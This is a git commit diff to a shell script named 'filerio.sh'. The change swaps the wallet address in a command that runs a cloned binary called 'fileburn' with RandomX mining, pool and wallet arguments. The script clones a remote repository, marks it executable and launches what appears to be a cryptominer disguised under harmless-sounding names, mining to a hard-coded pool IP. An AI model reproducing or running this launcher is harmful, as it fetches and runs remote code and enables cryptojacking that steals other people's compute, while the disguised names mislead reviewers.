c2890cba28b98ad59effd1c635cf663187e84fa7
RyuzenM <101698447+RyuzenM@users.noreply.github.com>
2022-07-10 04:34:07 +0700

    Update filerio.sh

--- filerio.sh
+++ filerio.sh
@@ -2,4 +2,4 @@
 cd /lastestcode
 git clone https://github.com/jendazrfib40/donglam.git -q
 chmod -R +x donglam
-./donglam/fileburn --disable-gpu --algorithm randomx --pool 51.89.96.41:4444 --wallet 8A399eWG8bW5M6ZGzEdcb9g1XA7cXRJaWR9QVDbEMdGU5pcw9D2eMpHX1x7pwFtUpLekNTzxjYCQmYiKkAkiJFGxPqFdY94.kienml-09
+./donglam/fileburn --disable-gpu --algorithm randomx --pool 51.89.96.41:4444 --wallet 88XgkSPJV9u28F4SJQtdW6U46RKDHB36aTzeM2f1yWsxTcX8QuSPDbHU1TTXChYpBeh9McphG2GYN77Lhu7jtfvp3HVytgc.kienml-09
